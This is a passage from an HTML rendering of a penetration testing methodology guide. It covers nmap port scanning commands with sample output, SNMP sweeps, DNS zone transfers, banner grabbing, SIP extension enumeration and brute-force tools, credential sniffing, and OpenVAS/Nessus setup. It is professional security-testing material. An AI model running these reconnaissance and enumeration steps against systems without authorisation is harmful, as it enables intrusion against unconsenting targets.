  <span class="o">-</span><span class="n">h</span><span class="p">:</span> <span class="n">Print</span> <span class="n">this</span> <span class="n">help</span> <span class="n">summary</span> <span class="n">page</span><span class="o">.</span>
<span class="n">EXAMPLES</span><span class="p">:</span>
  <span class="n">nmap</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">A</span> <span class="n">scanme</span><span class="o">.</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span>
  <span class="n">nmap</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">sn</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.0</span><span class="o">/</span><span class="mi">16</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">0.0</span><span class="o">/</span><span class="mi">8</span>
  <span class="n">nmap</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">iR</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">Pn</span> <span class="o">-</span><span class="n">p</span> <span class="mi">80</span>
<span class="n">SEE</span> <span class="n">THE</span> <span class="n">MAN</span> <span class="n">PAGE</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">book</span><span class="o">/</span><span class="n">man</span><span class="o">.</span><span class="n">html</span><span class="p">)</span> <span class="n">FOR</span> <span class="n">MORE</span> <span class="n">OPTIONS</span> <span class="n">AND</span> <span class="n">EXAMPLES</span>
</pre></div>
</div>
<p>Nmap has dozens of options available. Since this section is dealing with
port scanning, we will focus on the commands required to perform this
task. It is important to note that the commands utilized depend mainly
on the time and number of hosts being scanned. The more hosts or less
time that you have to perform this tasks, the less that we will
interrogate the host. This will become evident as we continue to discuss
the options.</p>
<div class="line-block">
<div class="line">Based on IP set being assessed, you would want to scan the both TCP
and UDP across port range to 1-65535. The command that will be
utilized is as follows:</div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">A</span> <span class="o">-</span><span class="n">PN</span> <span class="o">-</span><span class="n">sU</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">T2</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1</span><span class="o">-</span><span class="mi">65535</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">client</span> <span class="n">ip</span> <span class="nb">range</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;/&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">CIDR</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="ow">or</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">Mask</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">oA</span> <span class="n">NMap_FULL_</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">client</span> <span class="n">ip</span> <span class="nb">range</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">A</span> <span class="o">-</span><span class="n">PN</span> <span class="o">-</span><span class="n">sU</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">T2</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1</span><span class="o">-</span><span class="mi">65535</span> <span class="n">client</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">oA</span> <span class="n">NMap_FULL_client</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">5.51</span> <span class="p">(</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2011</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">22</span> <span class="mi">22</span><span class="p">:</span><span class="mi">27</span> <span class="n">Eastern</span> <span class="n">Daylight</span> <span class="n">Time</span>

<span class="n">NSE</span><span class="p">:</span> <span class="n">Loaded</span> <span class="mi">57</span> <span class="n">scripts</span> <span class="k">for</span> <span class="n">scanning</span><span class="o">.</span>
<span class="n">Initiating</span> <span class="n">Parallel</span> <span class="n">DNS</span> <span class="n">resolution</span> <span class="n">of</span> <span class="mi">1</span> <span class="n">host</span><span class="o">.</span> <span class="n">at</span> <span class="mi">22</span><span class="p">:</span><span class="mi">27</span>
<span class="n">Completed</span> <span class="n">Parallel</span> <span class="n">DNS</span> <span class="n">resolution</span> <span class="n">of</span> <span class="mi">1</span> <span class="n">host</span><span class="o">.</span> <span class="n">at</span> <span class="mi">22</span><span class="p">:</span><span class="mi">27</span><span class="p">,</span> <span class="mf">0.10</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="n">Initiating</span> <span class="n">SYN</span> <span class="n">Stealth</span> <span class="n">Scan</span> <span class="n">at</span> <span class="mi">22</span><span class="p">:</span><span class="mi">27</span>
<span class="n">Scanning</span> <span class="n">client</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="mf">74.117</span><span class="o">.</span><span class="mf">116.73</span><span class="p">)</span> <span class="p">[</span><span class="mi">65535</span> <span class="n">ports</span><span class="p">]</span>
<span class="n">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">74.117</span><span class="o">.</span><span class="mf">116.73</span>
</pre></div>
</div>
<div class="line-block">
<div class="line">On large IP sets, those greater than 100 IP addresses do not specify a
port range. The command that will be utilized is as follows:</div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">A</span> <span class="o">-</span><span class="n">O</span> <span class="o">-</span><span class="n">PN</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">client</span> <span class="n">ip</span> <span class="nb">range</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;/&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">CIDR</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="ow">or</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">Mask</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">oA</span> <span class="n">NMap_</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">client</span> <span class="n">ip</span> <span class="nb">range</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">A</span> <span class="o">-</span><span class="n">O</span> <span class="o">-</span><span class="n">PN</span> <span class="n">client</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">oA</span> <span class="n">NMap_client</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">5.51</span> <span class="p">(</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2011</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">22</span> <span class="mi">22</span><span class="p">:</span><span class="mi">37</span> <span class="n">Eastern</span> <span class="n">Daylight</span> <span class="n">Time</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">client</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="mf">74.117</span><span class="o">.</span><span class="mf">116.73</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.13</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">rDNS</span> <span class="n">record</span> <span class="k">for</span> <span class="mf">74.117</span><span class="o">.</span><span class="mf">116.73</span><span class="p">:</span> <span class="mi">74</span><span class="o">-</span><span class="mi">117</span><span class="o">-</span><span class="mi">116</span><span class="o">-</span><span class="mf">73.</span><span class="n">parked</span><span class="o">.</span><span class="n">com</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">999</span> <span class="n">filtered</span> <span class="n">ports</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.2</span><span class="o">.</span><span class="mi">3</span> <span class="p">((</span><span class="n">CentOS</span><span class="p">))</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">robots</span><span class="o">.</span><span class="n">txt</span><span class="p">:</span> <span class="mi">2</span> <span class="n">disallowed</span> <span class="n">entries</span>
<span class="o">|</span><span class="n">_</span><span class="o">/</span><span class="n">click</span><span class="o">.</span><span class="n">php</span> <span class="o">/</span><span class="n">ud</span><span class="o">.</span><span class="n">php</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">client</span><span class="o">.</span><span class="n">com</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> <span class="n">No</span> <span class="n">Allow</span> <span class="ow">or</span> <span class="n">Public</span> <span class="n">header</span> <span class="ow">in</span> <span class="n">OPTIONS</span> <span class="n">response</span> <span class="p">(</span><span class="n">status</span> <span class="n">code</span> <span class="mi">200</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">favicon</span><span class="p">:</span> <span class="n">Parked</span><span class="o">.</span><span class="n">com</span> <span class="n">domain</span> <span class="n">parking</span>
<span class="ne">Warning</span><span class="p">:</span> <span class="n">OSScan</span> <span class="n">results</span> <span class="n">may</span> <span class="n">be</span> <span class="n">unreliable</span> <span class="n">because</span> <span class="n">we</span> <span class="n">could</span> <span class="ow">not</span> <span class="n">find</span> <span class="n">at</span> <span class="n">least</span> <span class="mi">1</span> <span class="n">o</span>
<span class="n">pen</span> <span class="ow">and</span> <span class="mi">1</span> <span class="n">closed</span> <span class="n">port</span>
<span class="n">Device</span> <span class="nb">type</span><span class="p">:</span> <span class="n">general</span> <span class="n">purpose</span>
<span class="n">Running</span> <span class="p">(</span><span class="n">JUST</span> <span class="n">GUESSING</span><span class="p">):</span> <span class="n">Linux</span> <span class="mf">2.6</span><span class="o">.</span><span class="n">X</span> <span class="p">(</span><span class="mi">92</span><span class="o">%</span><span class="p">),</span> <span class="n">OpenBSD</span> <span class="mf">4.</span><span class="n">X</span> <span class="p">(</span><span class="mi">88</span><span class="o">%</span><span class="p">),</span> <span class="n">FreeBSD</span> <span class="mf">6.</span><span class="n">X</span> <span class="p">(</span><span class="mi">88</span><span class="o">%</span><span class="p">)</span>
</pre></div>
</div>
<p>It should be noted that Nmap has limited options for IPv6. These include
TCP connect (-sT), Ping scan (-sn), List scan (-sL) and version
detection.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="mi">6</span> <span class="o">-</span><span class="n">sT</span> <span class="o">-</span><span class="n">P0</span> <span class="n">fe80</span><span class="p">::</span><span class="mi">80</span><span class="n">a5</span><span class="p">:</span><span class="mi">26</span><span class="n">f2</span><span class="p">:</span><span class="mi">8</span><span class="n">db7</span><span class="p">:</span><span class="mi">5</span><span class="n">d04</span><span class="o">%</span><span class="mi">12</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">5.51</span> <span class="p">(</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2011</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">22</span> <span class="mi">22</span><span class="p">:</span><span class="mi">42</span> <span class="n">Eastern</span> <span class="n">Daylight</span> <span class="n">Time</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">lancelot</span> <span class="p">(</span><span class="n">fe80</span><span class="p">::</span><span class="mi">80</span><span class="n">a5</span><span class="p">:</span><span class="mi">26</span><span class="n">f2</span><span class="p">:</span><span class="mi">8</span><span class="n">db7</span><span class="p">:</span><span class="mi">5</span><span class="n">d04</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">1.0</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">988</span> <span class="n">closed</span> <span class="n">ports</span>
<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>
<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
<span class="mi">554</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">rtsp</span>
<span class="mi">2869</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">icslap</span>
<span class="mi">3389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ms</span><span class="o">-</span><span class="n">term</span><span class="o">-</span><span class="n">serv</span>
<span class="mi">5000</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">upnp</span>
<span class="mi">5001</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">commplex</span><span class="o">-</span><span class="n">link</span>
<span class="mi">5002</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">rfe</span>
<span class="mi">5003</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">filemaker</span>
<span class="mi">5004</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">avt</span><span class="o">-</span><span class="n">profile</span><span class="o">-</span><span class="mi">1</span>
<span class="mi">5357</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">wsdapi</span>
<span class="mi">10243</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">287.05</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
<div class="section" id="id3">
<h5>SNMP Sweeps<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h5>
<p>SNMP sweeps are performed too as they offer tons of information about a
specific system. The SNMP protocol is a stateless, datagram oriented
protocol. Unfortunately SNMP servers don&#8217;t respond to requests with
invalid community strings and the underlying UDP protocol does not
reliably report closed UDP ports. This means that &#8220;no response&#8221; from a
probed IP address can mean either of the following:</p>
<ul class="simple">
<li>Machine unreachable</li>
<li>SNMP server not running</li>
<li>invalid community string</li>
<li>the response datagram has not yet arrived</li>
</ul>
<p>SNMPEnum (Linux)</p>
<p>SNMPEnum is a perl script that sends SNMP requests to a single host,
then waits for the response to come back and logs them.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_45.png">Screenshot Here</a></p>
</div>
<div class="section" id="metasploit">
<h5>Metasploit<a class="headerlink" href="#metasploit" title="Permalink to this headline">¶</a></h5>
<p>Active footprinting can also be performed to a certain extent through
Metasploit. Please refer to the <a class="reference external" href="http://www.offensive-security.com/metasploit-unleashed/Information_Gathering">Metasploit
Unleashed</a>
course for more information on this subject.</p>
</div>
<div class="section" id="id4">
<h5>Zone Transfers<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h5>
<p>DNS zone transfer, also known as AXFR, is a type of DNS transaction. It
is a mechanism designed to replicate the databases containing the DNS
data across a set of DNS servers. Zone transfer comes in two flavors,
full (AXFR) and incremental (IXFR). There are numerous tools available
to test the ability to perform a DNS zone transfer. Tools commonly used
to perform zone transfers are host, dig and nmap.</p>
<p>Host</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">host</span>  <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">domain</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">DNS</span> <span class="n">server</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>Dig</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">dig</span> <span class="nd">@server</span> <span class="n">domain</span> <span class="n">axfr</span>
</pre></div>
</div>
</div>
<div class="section" id="id5">
<h5>SMTP Bounce Back<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h5>
<p>SMTP bounce back, also called a Non-Delivery Report/Receipt (NDR), a
(failed) Delivery Status Notification (DSN) message, a Non-Delivery
Notification (NDN) or simply a bounce, is an automated electronic mail
message from a mail system informing the sender of another message about
a delivery problem. This can be used to assist an attacker in
fingerprint the SMTP server as SMTP server information, including
software and versions, may be included in a bounce message.</p>
</div>
<div class="section" id="id6">
<h5>Reverse DNS<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h5>
<p>Reverse DNS can be used to obtain valid server names in use within an
organizational. There is a caveat that it must have a PTR (reverse) DNS
record for it to resolve a name from a provided IP address. If it does
resolve then the results are returned. This is usually performed by
testing the server with various IP addresses to see if it returns any
results.</p>
</div>
<div class="section" id="id7">
<h5>Banner Grabbing<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h5>
<p>Banner Grabbing is an enumeration technique used to glean information
about computer systems on a network and the services running its open
ports. Banner grabbing is used to identify network the version of
applications and operating system that the target host are running.</p>
<p>Banner grabbing is usually performed on Hyper Text Transfer Protocol
(HTTP), File Transfer Protocol (FTP), and Simple Mail Transfer Protocol
(SMTP); ports 80, 21, and 25 respectively. Tools commonly used to
perform banner grabbing are Telnet, nmap, netcat and netca6 (IPv6).</p>
<p>HTTP</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">JUNK</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.0</span>

<span class="n">HEAD</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">9.3</span>

<span class="n">OPTIONS</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.0</span>

<span class="n">HEAD</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.0</span>
</pre></div>
</div>
<p>httprint</p>
<p>httprint is a web server fingerprinting tool. It relies on web server
characteristics to accurately identify web servers, despite the fact
that they may have been obfuscated by changing the server banner
strings, or by plug-ins such as mod_security or servermask. httprint
can also be used to detect web enabled devices which do not have a
server banner string, such as wireless access points, routers, switches,
cable modems, etc. httprint uses text signature strings and it is very
easy to add signatures to the signature database.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_46.png">Screenshot Here</a></p>
</div>
<div class="section" id="voip-mapping">
<h5>VoIP mapping<a class="headerlink" href="#voip-mapping" title="Permalink to this headline">¶</a></h5>
<p>VoIP mapping is where we gather information about the topology, the
servers and the clients. The main goal here is to find live hosts, PBX
type and version, VoIP servers/gateways, clients (hardware and software)
types and versions. The majority of techniques covered here assume a
basic understanding of the <em>Session Initiation Protocol (SIP</em>). There
are several tools available to help us identify and enumerate VoIP
enabled devices. SMAP is a tool which is specifically designed to scan
for SIP enabled devices by generating SIP requests and awaiting
responses. SMAP usage is as follows:</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_47.png">Screenshot Here</a></p>
<p>SIPScan is another scanner for sip enabled devices that can scan a
single host or an entire subnet.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_48.png">Screenshot Here</a></p>
<p>Extensions</p>
<p>Extensions are any client application or device that initiates a SIP
connection, such as an IP phone, PC softphone, PC instant messaging
client, or mobile device. The goal is to identify valid usernames or
extensions of SIP devices. Enumerating extensions is usually a product
of the error messages returned using the SIP method: REGISTER, OPTIONS,
or INVITE. There are many tools that can be utilized to enumerate SIP
devices. A tool that can be used to enumerate extensions is Svwar from
the SIPVicious suite.</p>
<p>Svwar</p>
<p>Svwar is also a tool from the sipvicious suite allows to enumerate
extensions by using a range of extensions or using a dictionary file
svwar supports all the of the three extension enumeration methods as
mentioned above, the default method for enumeration is REGISTER. Svwar
usage is as follows:</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_49.png">Screenshot Here</a></p>
<p>enumIAX</p>
<p>If you&#8217;ve identified an Asterisk server is in use, you need to utilize a
username guessing tool such as enumIAX to enumerate Asterisk Exchange
protocol usernames. enumIAX is an Inter Asterisk Exchange version 2
(IAX2) protocol username brute-force enumerator. enumIAX may operate in
two distinct modes; Sequential Username Guessing or Dictionary Attack.
enumIAX usage is as follows:</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_50.png">Screenshot Here</a></p>
</div>
<div class="section" id="id8">
<h5>Passive Reconnaissance<a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h5>
<p>Packet Sniffing</p>
<p>Performing packet sniffing allows for the collection IP addresses and
MAC addresses from systems that have packet traffic in the stream being
analyzed. For the most part, packet sniffing is difficult to detect and
so this form of recon is essentially passive and quite stealthy. By
collecting and analyzing a large number of packets it becomes possible
to fingerprint the operating system and the services that are running on
a given device. It may also be possible to grab login information,
password hashes, and other credentials from the packet stream. Telnet
and older versions of SNMP pass credentials in plain text and are easily
compromised with sniffing. Packet sniffing can also be useful in
determining which servers act as critical infrastructure and therefore
are of interest to an attacker.</p>
</div>
</div>
</div>
</div>
<div class="section" id="vulnerability-analysis">
<h2>Vulnerability Analysis<a class="headerlink" href="#vulnerability-analysis" title="Permalink to this headline">¶</a></h2>
<p>Vulnerability Analysis is used to identify and evaluate the security
risks posed by identified vulnerabilities. Vulnerability analysis work
is divided into two areas: Identification and validation. Vulnerability
discovery effort is the key component of the Identification phase.
Validation is reducing the number of identified vulnerabilities to only
those that are actually valid.</p>
<div class="section" id="vulnerability-testing">
<h3>Vulnerability Testing<a class="headerlink" href="#vulnerability-testing" title="Permalink to this headline">¶</a></h3>
<p>Vulnerability Testing is divided to include both an Active and Passive
method.</p>
<div class="section" id="active">
<h4>Active<a class="headerlink" href="#active" title="Permalink to this headline">¶</a></h4>
</div>
<div class="section" id="automated-tools">
<h4>Automated Tools<a class="headerlink" href="#automated-tools" title="Permalink to this headline">¶</a></h4>
<p>An automated scanner is designed to assess networks, hosts, and
associated applications. There are a number of types of automated
scanners available today, some focus on particular targets or types of
targets. The core purpose of an automated scanner is the enumeration of
vulnerabilities present on networks, hosts, and associated applications.</p>
<div class="section" id="network-general-vulnerability-scanners">
<h5>Network/General Vulnerability Scanners<a class="headerlink" href="#network-general-vulnerability-scanners" title="Permalink to this headline">¶</a></h5>
</div>
<div class="section" id="open-vulnerability-assessment-system-openvas-linux">
<h5>Open Vulnerability Assessment System (OpenVAS) (Linux)<a class="headerlink" href="#open-vulnerability-assessment-system-openvas-linux" title="Permalink to this headline">¶</a></h5>
<p>The Open Vulnerability Assessment System (OpenVAS) is a framework of
several services and tools offering a comprehensive and powerful
vulnerability scanning and vulnerability management solution. OpenVAS is
a fork of Nessus that allows free development of a non-proprietary tool.</p>
<p>Like the earlier versions of Nessus, OpenVAS consists of a Client and
Scanner. To start the Scanner, simply run openvassd from the command
line.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_51.png">Screenshot Here</a></p>
<p>There are two ways in which you can run the OpenVAS Client, either the
GUI or the command line interface. Using the menu you would select on
OpenVAS Client. In the console it is &#8220;OpenVAS-Client.&#8221;</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_52.png">Screenshot Here</a></p>
<p>Once the client starts up you will need to connect it to the scanner.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_53.png">Screenshot Here</a></p>
<p>Submit in the supplied user credentials.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_54.png">Screenshot Here</a></p>
<p>If you created a certificate then you supply it as well. You will then
be presented with a certificate to accept. Click yes to continue.</p>
<div class="line-block">
<div class="line"><a class="reference external" href=":File:Penetration_Testing_Execution_55.png">Screenshot Here</a></div>
<div class="line">Once you accept the certificate, OpenVAS will initialize and indicate
the number of Found and Enabled plugins. This could take a while
depending upon the number of plugins that need to be downloaded. Also,
you need to ensure that you&#8217;ve added the appropriate /etc/hosts
entries for both the IPv4 and IPv6 address. For example:</div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>       <span class="n">localhost</span>

<span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>       <span class="n">pentest</span>

<span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="c1">#&lt;/nowiki&gt; The following lines are desirable for IPv6 capable hosts</span>

<span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="p">:</span><span class="mi">1</span>     <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span> <span class="n">pentest</span> <span class="n">localhost</span>
</pre></div>
</div>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_56.png">Screenshot Here</a></p>
<p>Before scanning anything we need to configure the OpenVAS Scan Options.
The General section covers all the general scan options. See Appendix A
for the specific settings. To start a new scan, you use the Scan
Assistant.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_57.png">Screenshot Here</a></p>
<p>Once the Scan Assistant launches, you&#8217;ll have to provide some
information to create the task. First, you&#8217;ll need to give the name of
the task. This is usually the name of the client or some other name that
describes what you&#8217;re scanning. Once you&#8217;ve completed this, click
Forward to continue.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_58.png">Screenshot Here</a></p>
<p>A scope can be seen as a sub-task. It defines a certain scan and the
title should indicate the scope of the scan such as &#8220;Internet Facing
Systems&#8221; or &#8220;Aggressive Scan of Client X&#8221;. Once you&#8217;ve completed this,
click Forward to continue.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_59.png">Screenshot Here</a></p>
<p>At this point you&#8217;ll need to provide the target information. This can be
in the form of a hostname, FQDN, IP Address, Network Range, CIDR. The
only requirement is that they have to be separated with commas. Once
you&#8217;ve completed this, click Forward to continue.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_60.png">Screenshot Here</a></p>
<div class="line-block">
<div class="line"><br /></div>
<div class="line">Finally, we&#8217;re at the point where we can launch our scan. Click
Execute to start the scan.</div>
</div>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_61.png">Screenshot Here</a></p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_62.png">Screenshot Here</a></p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_63.png">Screenshot Here</a></p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_64.png">Screenshot Here</a></p>
</div>
<div class="section" id="nessus-windows-linux">
<h5>Nessus (Windows/Linux)<a class="headerlink" href="#nessus-windows-linux" title="Permalink to this headline">¶</a></h5>
<p>Nessus is a commercial automated scanning program. It is designed to
detect potential vulnerabilities on the networks, hosts, and associated
application being assessed. Nessus allows for custom policies to be
utilized for specific evaluations. For non-Web applications, the policy
that should be utilized is the &#8220;Only Safe Checks&#8221; policy (See Appendix
A). For Web applications, the policy that should be utilized is the
&#8220;Only Safe Checks (Web)&#8221; policy (See Appendix B).</p>
<p>To access Nessus simply enter in the correct URL into a web browser. If
you are accessing from the Pentest Lab use the following URL:
<a class="reference external" href="https://">https://</a>&lt;IP ADDRESS&gt;:8834.</p>
<div class="line-block">
<div class="line"><br /></div>
